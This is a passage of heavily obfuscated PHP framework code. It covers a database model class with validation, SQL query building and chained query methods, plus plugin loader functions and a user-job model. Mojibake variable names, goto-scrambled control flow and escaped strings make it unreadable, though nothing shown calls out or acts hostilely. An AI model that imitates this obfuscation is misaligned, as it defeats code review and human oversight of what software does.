$CêÑ®ÉèÇ); } break; case $d‘´Õ›œóÆ[261]: $c£ç’Œ°„â[$bÄµ¿ß­èø[0]] = $c£ç’Œ°„â[$bÄµ¿ß­èø[1]]; break; case $d‘´Õ›œóÆ[311]: if ($d‘´Õ›œóÆ[33] === $c£ç’Œ°„â[$bÄµ¿ß­èø[0]]) { unset($c£ç’Œ°„â[$bÄµ¿ß­èø[0]]); } break; case $d‘´Õ›œóÆ[312]: default: $c£ç’Œ°„â[$bÄµ¿ß­èø[0]] = $bÄµ¿ß­èø[1]; } if (!1 === $c£ç’Œ°„â[$bÄµ¿ß­èø[0]]) { unset($c£ç’Œ°„â[$bÄµ¿ß­èø[0]]); } } } } return $c£ç’Œ°„â; } protected function autoValidation($bì¬å¯Ä‰, $bĞÁ‡šçäÂ) { $a›ê˜æ¬°ï =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!empty($this->options[$a›ê˜æ¬°ï[313]])) { $d’èÂëÔÚ¶ = $this->options[$a›ê˜æ¬°ï[313]]; unset($this->options[$a›ê˜æ¬°ï[313]]); } elseif (!empty($this->_validate)) { $d’èÂëÔÚ¶ = $this->_validate; } if (isset($d’èÂëÔÚ¶)) { if ($this->patchValidate) { $this->error = array(); } foreach ($d’èÂëÔÚ¶ as $fáÅğáø·µ => $AĞ“îóõÑ¡) { if (empty($AĞ“îóõÑ¡[5]) || $AĞ“îóõÑ¡[5] == THINK_MODEL_BOTH || $AĞ“îóõÑ¡[5] == $bĞÁ‡šçäÂ) { if (0 == strpos($AĞ“îóõÑ¡[2], $a›ê˜æ¬°ï[314]) && strpos($AĞ“îóõÑ¡[2], $a›ê˜æ¬°ï[315])) { $AĞ“îóõÑ¡[2] = think_lang(substr($AĞ“îóõÑ¡[2], 2, -1)); } $AĞ“îóõÑ¡[3] = isset($AĞ“îóõÑ¡[3]) ? $AĞ“îóõÑ¡[3] : THINK_EXISTS_VALIDATE; $AĞ“îóõÑ¡[4] = isset($AĞ“îóõÑ¡[4]) ? $AĞ“îóõÑ¡[4] : $a›ê˜æ¬°ï[316]; switch ($AĞ“îóõÑ¡[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($bì¬å¯Ä‰, $AĞ“îóõÑ¡)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($a›ê˜æ¬°ï[33] != trim($bì¬å¯Ä‰[$AĞ“îóõÑ¡[0]])) { if (!1 === $this->_validationField($bì¬å¯Ä‰, $AĞ“îóõÑ¡)) { return !1; } } break; default: if (isset($bì¬å¯Ä‰[$AĞ“îóõÑ¡[0]])) { if (!1 === $this->_validationField($bì¬å¯Ä‰, $AĞ“îóõÑ¡)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Aï´®£÷ã¤, $e‘î®Ïò¦ğ) { if (!1 === $this->_validationFieldItem($Aï´®£÷ã¤, $e‘î®Ïò¦ğ)) { if ($this->patchValidate) { $this->error[$e‘î®Ïò¦ğ[0]] = $e‘î®Ïò¦ğ[2]; } else { $this->error = $e‘î®Ïò¦ğ[2]; return !1; } } return; } protected function _validationFieldItem($b­—³˜¿ÒÉ, $dÌ Ñî‰Œ‚) { $cî£·Ê­‡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; switch (strtolower(trim($dÌ Ñî‰Œ‚[4]))) { case $cî£·Ê­‡[309]: case $cî£·Ê­‡[310]: $F™™Š‡˜Ê– = isset($dÌ Ñî‰Œ‚[6]) ? (array) $dÌ Ñî‰Œ‚[6] : array(); if (is_string($dÌ Ñî‰Œ‚[0]) && strpos($dÌ Ñî‰Œ‚[0], $cî£·Ê­‡[47])) { $dÌ Ñî‰Œ‚[0] = explode($cî£·Ê­‡[47], $dÌ Ñî‰Œ‚[0]); } if (is_array($dÌ Ñî‰Œ‚[0])) { foreach ($dÌ Ñî‰Œ‚[0] as $d— Àô´„) { $Eáİ›ì¥Â[$d— Àô´„] = $b­—³˜¿ÒÉ[$d— Àô´„]; } array_unshift($F™™Š‡˜Ê–, $Eáİ›ì¥Â); } else { array_unshift($F™™Š‡˜Ê–, $b­—³˜¿ÒÉ[$dÌ Ñî‰Œ‚[0]]); } if ($cî£·Ê­‡[309] == $dÌ Ñî‰Œ‚[4]) { return call_user_func_array($dÌ Ñî‰Œ‚[1], $F™™Š‡˜Ê–); } else { return call_user_func_array(array(&$this, $dÌ Ñî‰Œ‚[1]), $F™™Š‡˜Ê–); } case $cî£·Ê­‡[317]: return $b­—³˜¿ÒÉ[$dÌ Ñî‰Œ‚[0]] == $b­—³˜¿ÒÉ[$dÌ Ñî‰Œ‚[1]]; case $cî£·Ê­‡[318]: if (is_string($dÌ Ñî‰Œ‚[0]) && strpos($dÌ Ñî‰Œ‚[0], $cî£·Ê­‡[47])) { $dÌ Ñî‰Œ‚[0] = explode($cî£·Ê­‡[47], $dÌ Ñî‰Œ‚[0]); } $B…èø‘¤—ï = array(); if (is_array($dÌ Ñî‰Œ‚[0])) { foreach ($dÌ Ñî‰Œ‚[0] as $d— Àô´„) { $B…èø‘¤—ï[$d— Àô´„] = $b­—³˜¿ÒÉ[$d— Àô´„]; } } else { $B…èø‘¤—ï[$dÌ Ñî‰Œ‚[0]] = $b­—³˜¿ÒÉ[$dÌ Ñî‰Œ‚[0]]; } if (!empty($b­—³˜¿ÒÉ[$this->getPk()])) { $B…èø‘¤—ï[$this->getPk()] = array($cî£·Ê­‡[319], $b­—³˜¿ÒÉ[$this->getPk()]); } if ($this->where($B…èø‘¤—ï)->find()) { return !1; } return !0; default: return $this->check($b­—³˜¿ÒÉ[$dÌ Ñî‰Œ‚[0]], $dÌ Ñî‰Œ‚[1], $dÌ Ñî‰Œ‚[4]); } } public function check($béÄ”‹†, $e¢Ôº·¬¶Ê, $A›—¶³î†˜ = "\x72\x65\147\x65\x78") { $Fó´¿çŸ‘ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A›—¶³î†˜ = strtolower(trim($A›—¶³î†˜)); switch ($A›—¶³î†˜) { case $Fó´¿çŸ‘[7]: case $Fó´¿çŸ‘[320]: $E„ƒ³Ï˜øÍ = is_array($e¢Ôº·¬¶Ê) ? $e¢Ôº·¬¶Ê : explode($Fó´¿çŸ‘[47], $e¢Ôº·¬¶Ê); return $A›—¶³î†˜ == $Fó´¿çŸ‘[7] ? in_array($béÄ”‹†, $E„ƒ³Ï˜øÍ) : !in_array($béÄ”‹†, $E„ƒ³Ï˜øÍ); case $Fó´¿çŸ‘[321]: case $Fó´¿çŸ‘[322]: if (is_array($e¢Ôº·¬¶Ê)) { $aÙ‹™ë¥²¥ = $e¢Ôº·¬¶Ê[0]; $A´éÈ‚¯Î¾ = $e¢Ôº·¬¶Ê[1]; } else { list($aÙ‹™ë¥²¥, $A´éÈ‚¯Î¾) = explode($Fó´¿çŸ‘[47], $e¢Ôº·¬¶Ê); } return $A›—¶³î†˜ == $Fó´¿çŸ‘[321] ? $béÄ”‹† >= $aÙ‹™ë¥²¥ && $béÄ”‹† <= $A´éÈ‚¯Î¾ : $béÄ”‹† < $aÙ‹™ë¥²¥ || $béÄ”‹† > $A´éÈ‚¯Î¾; case $Fó´¿çŸ‘[323]: case $Fó´¿çŸ‘[324]: return $A›—¶³î†˜ == $Fó´¿çŸ‘[323] ? $béÄ”‹† == $e¢Ôº·¬¶Ê : $béÄ”‹† != $e¢Ôº·¬¶Ê; case $Fó´¿çŸ‘[325]: $CÜ“¿¦È¾ = mb_strlen($béÄ”‹†, $Fó´¿çŸ‘[326]); if (strpos($e¢Ôº·¬¶Ê, $Fó´¿çŸ‘[47])) { list($aÙ‹™ë¥²¥, $A´éÈ‚¯Î¾) = explode($Fó´¿çŸ‘[47], $e¢Ôº·¬¶Ê); return $CÜ“¿¦È¾ >= $aÙ‹™ë¥²¥ && $CÜ“¿¦È¾ <= $A´éÈ‚¯Î¾; } else { return $CÜ“¿¦È¾ == $e¢Ôº·¬¶Ê; } case $Fó´¿çŸ‘[327]: list($c¹½æ´áÕ”, $A®Ş™½“öÒ) = explode($Fó´¿çŸ‘[47], $e¢Ôº·¬¶Ê); if (!is_numeric($c¹½æ´áÕ”)) { $c¹½æ´áÕ” = strtotime($c¹½æ´áÕ”); } if (!is_numeric($A®Ş™½“öÒ)) { $A®Ş™½“öÒ = strtotime($A®Ş™½“öÒ); } return NOW_TIME >= $c¹½æ´áÕ” && NOW_TIME <= $A®Ş™½“öÒ; case $Fó´¿çŸ‘[328]: return in_array(get_client_ip(), explode($Fó´¿çŸ‘[47], $e¢Ôº·¬¶Ê)); case $Fó´¿çŸ‘[329]: return !in_array(get_client_ip(), explode($Fó´¿çŸ‘[47], $e¢Ôº·¬¶Ê)); case $Fó´¿çŸ‘[316]: default: return $this->regex($béÄ”‹†, $e¢Ôº·¬¶Ê); } } public function query($E ×õĞ•»ï, $DÂ‚ó±¥¹ = false) { $D­ÃØ·Ø³‡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!is_bool($DÂ‚ó±¥¹) && !is_array($DÂ‚ó±¥¹)) { $DÂ‚ó±¥¹ = func_get_args(); array_shift($DÂ‚ó±¥¹); } $E ×õĞ•»ï = str_replace(array($D­ÃØ·Ø³‡[217], $D­ÃØ·Ø³‡[330]), $D­ÃØ·Ø³‡[50], $E ×õĞ•»ï); $E ×õĞ•»ï = $this->parseSql($E ×õĞ•»ï, $DÂ‚ó±¥¹); return $this->db->query($E ×õĞ•»ï); } public function execute($fïŸ‘÷çÕ, $d•Ù¬„ÈÄ» = false) { if (!is_bool($d•Ù¬„ÈÄ») && !is_array($d•Ù¬„ÈÄ»)) { $d•Ù¬„ÈÄ» = func_get_args(); array_shift($d•Ù¬„ÈÄ»); } $fïŸ‘÷çÕ = $this->parseSql($fïŸ‘÷çÕ, $d•Ù¬„ÈÄ»); return $this->db->execute($fïŸ‘÷çÕ); } protected function parseSql($c†¼õçÛŠì, $CÖÄ®ƒï±’) { $c§›×ŞøÕ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!0 === $CÖÄ®ƒï±’) { $aí¸¼¿óó = $this->_parseOptions(); $c†¼õçÛŠì = $this->db->parseSql($c†¼õçÛŠì, $aí¸¼¿óó); } elseif (is_array($CÖÄ®ƒï±’)) { $CÖÄ®ƒï±’ = array_map(array($this->db, $c§›×ŞøÕ[331]), $CÖÄ®ƒï±’); $c†¼õçÛŠì = vsprintf($c†¼õçÛŠì, $CÖÄ®ƒï±’); } else { $c†¼õçÛŠì = strtr($c†¼õçÛŠì, array($c§›×ŞøÕ[332] => $this->getTableName(), $c§›×ŞøÕ[333] => think_config($c§›×ŞøÕ[232]))); } $this->db->setModel($this->name); return $c†¼õçÛŠì; } public function db($d„´Â†Ì…  = '', $aÏ™İ ™½± = '', $DºŒË²ÓƒŞ = array()) { goto fù™Ç´ğ†; fù™Ç´ğ†: $FË«àÓÒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($FË«àÓÒ[33] === $d„´Â†Ì…  && $this->db) { return $this->db; } static $D°Ó¶´›†Ö = array(); goto cÉåö»´Ò‰; bñ£‚É”ƒ•: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto AÎ‚˜¸ğ¦; cÉåö»´Ò‰: static $BÂ±™¥‚¤¥ = array(); if (!isset($BÂ±™¥‚¤¥[$d„´Â†Ì… ]) || isset($BÂ±™¥‚¤¥[$d„´Â†Ì… ]) && $aÏ™İ ™½± && $D°Ó¶´›†Ö[$d„´Â†Ì… ] != $aÏ™İ ™½±) { if (!empty($aÏ™İ ™½±) && is_string($aÏ™İ ™½±) && !1 === strpos($aÏ™İ ™½±, $FË«àÓÒ[8])) { $aÏ™İ ™½± = think_config($aÏ™İ ™½±); } $BÂ±™¥‚¤¥[$d„´Â†Ì… ] = Db::getInstance($aÏ™İ ™½±); } elseif (NULL === $aÏ™İ ™½±) { $BÂ±™¥‚¤¥[$d„´Â†Ì… ]->close(); unset($BÂ±™¥‚¤¥[$d„´Â†Ì… ]); return; } if (!empty($DºŒË²ÓƒŞ)) { if (is_string($DºŒË²ÓƒŞ)) { parse_str($DºŒË²ÓƒŞ, $DºŒË²ÓƒŞ); } foreach ($DºŒË²ÓƒŞ as $CÊçãÃ£éˆ => $dÍôÍœÜĞä) { $this->setProperty($CÊçãÃ£éˆ, $dÍôÍœÜĞä); } } goto E­êó±²Ÿµ; E­êó±²Ÿµ: $D°Ó¶´›†Ö[$d„´Â†Ì… ] = $aÏ™İ ™½±; $this->db = $BÂ±™¥‚¤¥[$d„´Â†Ì… ]; $this->_after_db(); goto bñ£‚É”ƒ•; AÎ‚˜¸ğ¦: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $C–öÕŠ‰Úá = get_class($this); if ($C–öÕŠ‰Úá == $_SERVER[´Ù×Íå‘ÄõÛ][334]) { return $this->name; } $this->name = substr($C–öÕŠ‰Úá, 0, -5); } return $this->name; } public function getTableName() { $f½¤äêŠğ÷ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (empty($this->trueTableName)) { $EÀ‡«±×¿» = !empty($this->tablePrefix) ? $this->tablePrefix : $f½¤äêŠğ÷[33]; if (!empty($this->tableName)) { $EÀ‡«±×¿» .= $this->tableName; } else { $EÀ‡«±×¿» .= think_parse_name($this->name); } $this->trueTableName = strtolower($EÀ‡«±×¿»); } return (!empty($this->dbName) ? $this->dbName . $f½¤äêŠğ÷[91] : $f½¤äêŠğ÷[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $e“ÇĞï¯â =& $_SERVER[´Ù×Íå‘ÄõÛ]; return isset($this->fields[$e“ÇĞï¯â[239]]) ? $this->fields[$e“ÇĞï¯â[239]] : $this->pk; } public function getDbFields() { $BÈ›©ÓòÓ÷ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (isset($this->options[$BÈ›©ÓòÓ÷[267]])) { $B’©ÑÏÆ = $this->db->getFields($this->options[$BÈ›©ÓòÓ÷[267]]); return $B’©ÑÏÆ ? array_keys($B’©ÑÏÆ) : !1; } if ($this->fields) { $B’©ÑÏÆ = $this->fields; unset($B’©ÑÏÆ[$BÈ›©ÓòÓ÷[238]], $B’©ÑÏÆ[$BÈ›©ÓòÓ÷[239]], $B’©ÑÏÆ[$BÈ›©ÓòÓ÷[240]], $B’©ÑÏÆ[$BÈ›©ÓòÓ÷[237]]); return $B’©ÑÏÆ; } return !1; } public function data($båÄ³Ëš¿ = '') { $EŠˆ†ÜøéÓ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($EŠˆ†ÜøéÓ[33] === $båÄ³Ëš¿ && !empty($this->data)) { return $this->data; } if (is_object($båÄ³Ëš¿)) { $båÄ³Ëš¿ = get_object_vars($båÄ³Ëš¿); } elseif (is_string($båÄ³Ëš¿)) { parse_str($båÄ³Ëš¿, $båÄ³Ëš¿); } elseif (!is_array($båÄ³Ëš¿)) { think_exception(think_lang($EŠˆ†ÜøéÓ[259])); } $this->data = $båÄ³Ëš¿; return $this; } public function join($eƒ Üµ„Áï) { $c©Éİ“Ø·ù =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (is_array($eƒ Üµ„Áï)) { $this->options[$c©Éİ“Ø·ù[270]] = $eƒ Üµ„Áï; } elseif (!empty($eƒ Üµ„Áï)) { $this->options[$c©Éİ“Ø·ù[270]][] = $eƒ Üµ„Áï; } return $this; } public function union($bµ»¥—Ö²Ú, $b§¬ƒøÖŸ± = false) { goto B˜“÷¢ÈÒ; BŒ¢É¬¼å¶: if (is_object($bµ»¥—Ö²Ú)) { $bµ»¥—Ö²Ú = get_object_vars($bµ»¥—Ö²Ú); } if (is_string($bµ»¥—Ö²Ú)) { $E‡Ú¤çæ£ = $bµ»¥—Ö²Ú; } elseif (is_array($bµ»¥—Ö²Ú)) { if (isset($bµ»¥—Ö²Ú[0])) { $this->options[$EÇé¤ áÙè[335]] = array_merge($this->options[$EÇé¤ áÙè[335]], $bµ»¥—Ö²Ú); return $this; } else { $E‡Ú¤çæ£ = $bµ»¥—Ö²Ú; } } else { think_exception(think_lang($EÇé¤ áÙè[259])); } $this->options[$EÇé¤ áÙè[335]][] = $E‡Ú¤çæ£; goto Eä‰Õ¥£¼; Eä‰Õ¥£¼: return $this; goto a›ÎÜäÔ«; B˜“÷¢ÈÒ: $EÇé¤ áÙè =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (empty($bµ»¥—Ö²Ú)) { return $this; } if ($b§¬ƒøÖŸ±) { $this->options[$EÇé¤ áÙè[335]][$EÇé¤ áÙè[336]] = !0; } goto BŒ¢É¬¼å¶; a›ÎÜäÔ«: } public function cache($Eßˆá©¹Íœ = true, $DÛÔœåŒ»æ = null, $aºã¥˜ = '') { $cÌÙƒÖÜ»¡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!1 !== $Eßˆá©¹Íœ) { $this->options[$cÌÙƒÖÜ»¡[337]] = array($cÌÙƒÖÜ»¡[89] => $Eßˆá©¹Íœ, $cÌÙƒÖÜ»¡[327] => $DÛÔœåŒ»æ, $cÌÙƒÖÜ»¡[29] => $aºã¥˜); } return $this; } public function field($dé”‹ç–Ü‘, $bˆ—†¾š‹± = false) { $BŸöŒÑìµ‚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!0 === $dé”‹ç–Ü‘) { $D§º ÉÂØÉ = $this->getDbFields(); $dé”‹ç–Ü‘ = $D§º ÉÂØÉ ? $D§º ÉÂØÉ : $BŸöŒÑìµ‚[176]; } elseif ($bˆ—†¾š‹±) { if (is_string($dé”‹ç–Ü‘)) { $dé”‹ç–Ü‘ = explode($BŸöŒÑìµ‚[47], $dé”‹ç–Ü‘); } $D§º ÉÂØÉ = $this->getDbFields(); $dé”‹ç–Ü‘ = $D§º ÉÂØÉ ? array_diff($D§º ÉÂØÉ, $dé”‹ç–Ü‘) : $dé”‹ç–Ü‘; } $this->options[$BŸöŒÑìµ‚[261]] = $dé”‹ç–Ü‘; return $this; } public function scope($f¯™´¢³³„ = '', $Eœ§»¹Ÿà = NULL) { $f©¯¦Ö§› =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($f©¯¦Ö§›[33] === $f¯™´¢³³„) { if (isset($this->_scope[$f©¯¦Ö§›[34]])) { $f‘†­Ô = $this->_scope[$f©¯¦Ö§›[34]]; } else { return $this; } } elseif (is_string($f¯™´¢³³„)) { $fÛšÄó²Ïì = explode($f©¯¦Ö§›[47], $f¯™´¢³³„); $f‘†­Ô = array(); foreach ($fÛšÄó²Ïì as $E‡§´Ç´‘) { if (!isset($this->_scope[$E‡§´Ç´‘])) { continue; } $f‘†­Ô = array_merge($f‘†­Ô, $this->_scope[$E‡§´Ç´‘]); } if (!empty($Eœ§»¹Ÿà) && is_array($Eœ§»¹Ÿà)) { $f‘†­Ô = array_merge($f‘†­Ô, $Eœ§»¹Ÿà); } } elseif (is_array($f¯™´¢³³„)) { $f‘†­Ô = $f¯™´¢³³„; } if (is_array($f‘†­Ô) && !empty($f‘†­Ô)) { $this->options = array_merge($this->options, array_change_key_case($f‘†­Ô)); } return $this; } public function where($E‹¨‰Ğ§¹, $AËÄ±¸ˆã = null) { $fÏ»¡ö¢†· =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!is_null($AËÄ±¸ˆã) && is_string($E‹¨‰Ğ§¹)) { if (!is_array($AËÄ±¸ˆã)) { $AËÄ±¸ˆã = func_get_args(); array_shift($AËÄ±¸ˆã); } $AËÄ±¸ˆã = array_map(array($this->db, $fÏ»¡ö¢†·[331]), $AËÄ±¸ˆã); $E‹¨‰Ğ§¹ = vsprintf($E‹¨‰Ğ§¹, $AËÄ±¸ˆã); } elseif (is_object($E‹¨‰Ğ§¹)) { $E‹¨‰Ğ§¹ = get_object_vars($E‹¨‰Ğ§¹); } elseif (is_array($E‹¨‰Ğ§¹)) { foreach ($E‹¨‰Ğ§¹ as $aÕÏã‚ä² => $FØÜ·„é¤) { if ((is_numeric($aÕÏã‚ä²) || !$aÕÏã‚ä²) && is_string($FØÜ·„é¤)) { think_trace($fÏ»¡ö¢†·[338], $fÏ»¡ö¢†·[33], $fÏ»¡ö¢†·[46]); die; } } } if (is_string($E‹¨‰Ğ§¹) && $fÏ»¡ö¢†·[33] != $E‹¨‰Ğ§¹) { $AßËŞœ‚» = array(); $AßËŞœ‚»[$fÏ»¡ö¢†·[339]] = $E‹¨‰Ğ§¹; $E‹¨‰Ğ§¹ = $AßËŞœ‚»; } if (isset($this->options[$fÏ»¡ö¢†·[263]])) { $this->options[$fÏ»¡ö¢†·[263]] = array_merge($this->options[$fÏ»¡ö¢†·[263]], $E‹¨‰Ğ§¹); } else { $this->options[$fÏ»¡ö¢†·[263]] = $E‹¨‰Ğ§¹; } return $this; } public function limit($Cƒí×•«áç, $eƒá¬÷¬•¸ = null) { $b¸ñ®Ë†±â =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->options[$b¸ñ®Ë†±â[280]] = is_null($eƒá¬÷¬•¸) ? $Cƒí×•«áç : $Cƒí×•«áç . $b¸ñ®Ë†±â[47] . $eƒá¬÷¬•¸; return $this; } public function page($EŠĞšÒ—Ä¶, $B»Şö•Ç™Õ = null) { $CˆÛ‚„·õÏ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->options[$CˆÛ‚„·õÏ[340]] = is_null($B»Şö•Ç™Õ) ? $EŠĞšÒ—Ä¶ : $EŠĞšÒ—Ä¶ . $CˆÛ‚„·õÏ[47] . $B»Şö•Ç™Õ; return $this; } public function comment($EŸÉˆºÙ÷) { $this->options[$_SERVER[´Ù×Íå‘ÄõÛ][341]] = $EŸÉˆºÙ÷; return $this; } public function setProperty($E‘¦®Ê ×ß, $EğĞàà»œ) { if (property_exists($this, $E‘¦®Ê ×ß)) { $this->{$E‘¦®Ê ×ß} = $EğĞàà»œ; } return $this; } } goto eÍ¡âğâĞ›; AÆ“¬ÖŒÏ: function Action($E‚¿ø¸Áë = '') { goto d£ÛšŞºñ‰; F„óµÒä²æ: $B¨Ğ¾÷š[$a †ŠÅ‘Æõ] = new $A´Á¼Ã©Ò(); $B¨Ğ¾÷š[$dõµ´Ä¶¡¬] = $B¨Ğ¾÷š[$a †ŠÅ‘Æõ]; return $B¨Ğ¾÷š[$a †ŠÅ‘Æõ]; goto f®ÕÇïğÍ÷; AğìŠõˆó¯: if (isset($B¨Ğ¾÷š[$a †ŠÅ‘Æõ])) { return $B¨Ğ¾÷š[$a †ŠÅ‘Æõ]; } if (is_file($aÖ´òìõôÎ)) { include_once $aÖ´òìõôÎ; } if (!class_exists($A´Á¼Ã©Ò)) { return actionCallError("\x5b{$E‚¿ø¸Áë}\40\75\x3e\x20{$A´Á¼Ã©Ò}\135\40\143\x6c\x61\x73\x73\x20\156\157\x74\40\x65\x78\x69\163\x74\x73\x21"); } goto F„óµÒä²æ; d£ÛšŞºñ‰: $AñÑ‘å¼Ç =& $_SERVER[ïÚûó†Îá]; static $B¨Ğ¾÷š = array(); $dõµ´Ä¶¡¬ = $E‚¿ø¸Áë; goto FÚÕ÷¹Š·­; FÚÕ÷¹Š·­: if (isset($B¨Ğ¾÷š[$dõµ´Ä¶¡¬])) { return $B¨Ğ¾÷š[$dõµ´Ä¶¡¬]; } $E‚¿ø¸Áë = trim(str_replace($AñÑ‘å¼Ç[4], $AñÑ‘å¼Ç[5], $E‚¿ø¸Áë), $AñÑ‘å¼Ç[4]); $fŠÌâá¶ = explode($AñÑ‘å¼Ç[5], $E‚¿ø¸Áë); goto BÏ©›ë¹¹; BÏ©›ë¹¹: $c¡Ùº™ñŞ = strtolower($fŠÌâá¶[0]); if (substr($c¡Ùº™ñŞ, -6) == $AñÑ‘å¼Ç[6]) { $E‚¿ø¸Áë = substr($fŠÌâá¶[0], 0, -6); $A´Á¼Ã©Ò = $E‚¿ø¸Áë . $AñÑ‘å¼Ç[7]; $aÖ´òìõôÎ = $AñÑ‘å¼Ç[8]; if (isset($fŠÌâá¶[1]) && substr(strtolower($fŠÌâá¶[1]), -5) == $AñÑ‘å¼Ç[9]) { $A´Á¼Ã©Ò = $E‚¿ø¸Áë . $fŠÌâá¶[1]; $aÖ´òìõôÎ = $AñÑ‘å¼Ç[10] . $fŠÌâá¶[1] . $AñÑ‘å¼Ç[11]; } else { if (count($fŠÌâá¶) == 3) { $A´Á¼Ã©Ò = $E‚¿ø¸Áë . $fŠÌâá¶[1] . $fŠÌâá¶[2]; $aÖ´òìõôÎ = $AñÑ‘å¼Ç[12] . $fŠÌâá¶[1] . $AñÑ‘å¼Ç[13] . $fŠÌâá¶[2] . $AñÑ‘å¼Ç[11]; } } $aÖ´òìõôÎ = PLUGIN_DIR . $E‚¿ø¸Áë . $AñÑ‘å¼Ç[4] . $aÖ´òìõôÎ; } else { if (substr($c¡Ùº™ñŞ, -5) == $AñÑ‘å¼Ç[9]) { $E‚¿ø¸Áë = substr($fŠÌâá¶[0], 0, -5); return Model($E‚¿ø¸Áë); } else { $A´Á¼Ã©Ò = $fŠÌâá¶[0] . $fŠÌâá¶[1]; $aÖ´òìõôÎ = CONTROLLER_DIR . $fŠÌâá¶[0] . $AñÑ‘å¼Ç[4] . $fŠÌâá¶[1] . $AñÑ‘å¼Ç[14]; } } $a †ŠÅ‘Æõ = strtolower($A´Á¼Ã©Ò); goto AğìŠõˆó¯; f®ÕÇïğÍ÷: } function ActionApply($Fß¿š¦«Íš, $BíŒ¤Ô ¹÷ = array()) { goto fÒîù±·; D•¶Öáß¦¦: if (!method_exists($EíõéËçè±, $c½¡«‘¡š)) { return actionCallError("{$Fß¿š¦«Íš}\x20\x6d\x65\x74\x68\x6f\x64\40\x6e\x6f\x74\x20\x65\x78\151\x73\x74\163\41"); } $Bó¥ŠáêĞö = call_user_func_array(array($EíõéËçè±, $c½¡«‘¡š), $BíŒ¤Ô ¹÷); return $Bó¥ŠáêĞö; goto F‡Ğ¶¯Ê³´; e‘ğ°Å÷‰ù: $b°É×„ËÜë = substr($Fß¿š¦«Íš, 0, $b­ØÚåÊŒ¶); $c½¡«‘¡š = substr($Fß¿š¦«Íš, $b­ØÚåÊŒ¶ + 1); $EíõéËçè± = Action($b°É×„ËÜë); goto D•¶Öáß¦¦; fÒîù±·: if (is_array($Fß¿š¦«Íš)) { return call_user_func_array($Fß¿š¦«Íš, $BíŒ¤Ô ¹÷); } if (function_exists($Fß¿š¦«Íš)) { return call_user_func_array($Fß¿š¦«Íš, $BíŒ¤Ô ¹÷); } $b­ØÚåÊŒ¶ = strrpos($Fß¿š¦«Íš, $_SERVER[ïÚûó†Îá][5]); goto e‘ğ°Å÷‰ù; F‡Ğ¶¯Ê³´: } function actionCallError($cíòŠ…Å—Ş) { return write_log($cíòŠ…Å—Ş, $_SERVER[ïÚûó†Îá][15]); } goto f’ñ×É‡¾â; føˆ–Æ˜Ÿæ: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\152\x6f\142\114\151\163\164"; public $field = array("\156\x61\155\x65", "\x64\x65\163\143", "\x73\157\x72\164"); const JOB_KEY = "\x73\x65\x6c\x66\x4a\157\x62\114\x69\163\164"; public function listData($F÷¡òñÜ© = false, $CÜ‚²ĞŠ©È = "\x73\x6f\162\164", $F‰£§åÉË¨ = false) { return parent::listData($F÷¡òñÜ©, $CÜ‚²ĞŠ©È, $F‰£§åÉË¨); } public function remove($AÍç‹©ò«) { return parent::remove($AÍç‹©ò«); } public function add($dÔˆ‘ßÃÙ) { $bñµŞÊì¶ª =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($this->findByName($dÔˆ‘ßÃÙ[$bñµŞÊì¶ª[28]])) { return !1; } $dÔˆ‘ßÃÙ[$bñµŞÊì¶ª[2133]] = $this->getSort(); return parent::insert($dÔˆ‘ßÃÙ); } private function getSort() { $eÙ¹Â½ö‚Ö =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bÄÂÖšŒÁ¹ = parent::listData(); $aï†ˆæ³ğÔ = array_to_keyvalue($bÄÂÖšŒÁ¹, $eÙ¹Â½ö‚Ö[33], $eÙ¹Â½ö‚Ö[2133]); return empty($aï†ˆæ³ğÔ) ? 0 : max($aï†ˆæ³ğÔ) + 1; } public function update($aÔµììé½É, $Cù·À³àõŒ) { $a„“òÜ†¼ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $BŠ¦çŠŸ„¸ = parent::listData($aÔµììé½É); $D•ê…»ÒË§ = $this->findByName($Cù·À³àõŒ[$a„“òÜ†¼[28]]); if (!$BŠ¦çŠŸ„¸ || $D•ê…»ÒË§ && $D•ê…»ÒË§[$a„“òÜ†¼[367]] != $BŠ¦çŠŸ„¸[$a„“òÜ†¼[367]]) { return !1; } return parent::update($aÔµììé½É, $Cù·À³àõŒ); } public function setUserJob($E°…†Ğ³È¶, $Eì´ÖŞôµÁ) { goto bÍ¼…ŒË; cîåîØÀ°à: $AéïåŒ†Ã = array_to_keyvalue($e»ôŒŠ—±‡, $CºÍ—”Õ…·[28]); $BÃÀ±òŒâã = $CºÍ—”Õ…·[361]; foreach ($Eì´ÖŞôµÁ as $D¯Ø äÉ°è) { if ($AéïåŒ†Ã[$D¯Ø äÉ°è]) { $BÃÀ±òŒâã .= $AéïåŒ†Ã[$D¯Ø äÉ°è][$CºÍ—”Õ…·[367]] . $CºÍ—”Õ…·[47]; } else { $eíô¡¹ÚÍ = $this->add($D¯Ø äÉ°è); $BÃÀ±òŒâã .= $eíô¡¹ÚÍ . 